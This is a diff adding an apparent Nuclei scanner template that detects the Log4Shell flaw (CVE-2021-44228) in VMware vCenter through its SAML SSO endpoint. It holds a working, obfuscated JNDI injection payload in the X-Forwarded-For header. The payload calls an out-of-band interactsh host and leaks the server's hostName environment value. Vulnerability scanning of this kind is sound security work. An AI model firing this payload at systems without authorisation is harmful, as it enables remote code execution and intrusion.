@@ -1,0 +1,42 @@
+id: vmware-vcenter-log4j-jndi-rce
+
+info:
+  name: VMware VCenter Log4j JNDI RCE
+  author: _0xf4n9x_
+  severity: high
+  description: A critical vulnerability in Apache Log4j identified by CVE-2021-44228 has been publicly disclosed that may allow for remote code execution in impacted VMware VCenter.
+  reference:
+    - https://twitter.com/tnpitsecurity/status/1469429810216771589
+    - https://www.vmware.com/security/advisories/VMSA-2021-0028.html
+  tags: rce,jndi,log4shell,log4j,vcenter
+
+requests:
+  - raw:
+      - |
+        GET /websso/SAML2/SSO/vsphere.local?SAMLRequest= HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0
+        X-Forwarded-For: ${jndi:${lower:d}n${lower:s}://${env:hostName}.{{interactsh-url}}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Upgrade-Insecure-Requests: 1
+
+    extractors:
+      - type: regex
+        part: interactsh_request
+        group: 1
+        regex:
+          - '([a-z0-9\.\-]+)\.([a-z0-9]+)\.interactsh\.com' # Extract ${hostName}
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        name: http
+        words:
+          - "http"
+
+      - type: word
+        part: interactsh_protocol
+        name: dns
+        words:
+          - "dns"
